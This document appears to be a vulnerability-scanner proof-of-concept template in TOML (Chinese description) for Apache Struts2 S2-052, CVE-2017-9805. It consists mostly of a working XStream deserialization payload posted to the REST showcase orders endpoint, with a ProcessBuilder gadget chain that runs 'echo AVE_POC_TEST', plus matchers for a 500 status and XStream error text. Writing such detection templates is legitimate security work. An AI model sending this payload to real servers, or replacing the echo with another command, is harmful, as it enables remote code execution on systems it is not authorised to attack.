[info]
author = "AVE"
description = "检测 Apache Struts2 REST Plugin 是否受 CVE-2017-9805 (S2-052) 影响。通过向 /orders/{id} 发送特制 XML 载荷触发 XStream 反序列化，若服务器返回 500 状态码且包含 XStream 相关错误信息，则存在漏洞。"
id = "POC-AVE-2017-1306"
name = "Apache Struts2 S2-052 REST Plugin XStream Deserialization RCE PoC"
severity = "high"
tags = [
    "cve-2017-9805",
    "struts",
    "rce",
    "xstream",
    "s2-052",
]
vuln_id = [
    "CVE-2017-9805",
    "AVE-2017-1306",
]

[poc]
logic = "any"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/struts2-rest-showcase/orders/3"
protocol = "http"

[poc.requests.body]
content = """
<map>
  <entry>
    <jdk.nashorn.internal.objects.NativeString>
      <flags>0</flags>
      <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
        <dataHandler>
          <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
            <is class="javax.crypto.CipherInputStream">
              <cipher class="javax.crypto.NullCipher">
                <initialized>false</initialized>
                <opmode>0</opmode>
                <serviceIterator class="javax.imageio.spi.FilterIterator">
                  <iter class="javax.imageio.spi.FilterIterator">
                    <iter class="java.util.Collections$EmptyIterator"/>
                    <next class="java.lang.ProcessBuilder">
                      <command>
                        <string>echo</string>
                        <string>AVE_POC_TEST</string>
                      </command>
                      <redirectErrorStream>false</redirectErrorStream>
                    </next>
                  </iter>
                  <filter class="javax.imageio.ImageIO$ContainsFilter">
                    <method>
                      <class>java.lang.ProcessBuilder</class>
                      <name>start</name>
                      <parameter-types/>
                    </method>
                    <name>foo</name>
                  </filter>
                  <next class="string">foo</next>
                </serviceIterator>
                <lock/>
              </cipher>
              <input class="java.lang.ProcessBuilder$NullInputStream"/>
              <ibuffer></ibuffer>
              <done>false</done>
              <ostart>0</ostart>
              <ofinish>0</ofinish>
              <closed>false</closed>
            </is>
            <consumed>false</consumed>
          </dataSource>
          <transferFlavors/>
        </dataHandler>
        <dataLen>0</dataLen>
      </value>
    </jdk.nashorn.internal.objects.NativeString>
    <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
  </entry>
  <entry>
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
  </entry>
</map>"""
type = "raw"

[poc.requests.headers]
Content-Type = "application/xml"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Debugging information",
    "com.thoughtworks.xstream.converters.collections.MapConverter",
]

[[poc.requests.matchers]]
expect = true
status = [500]
type = "status"

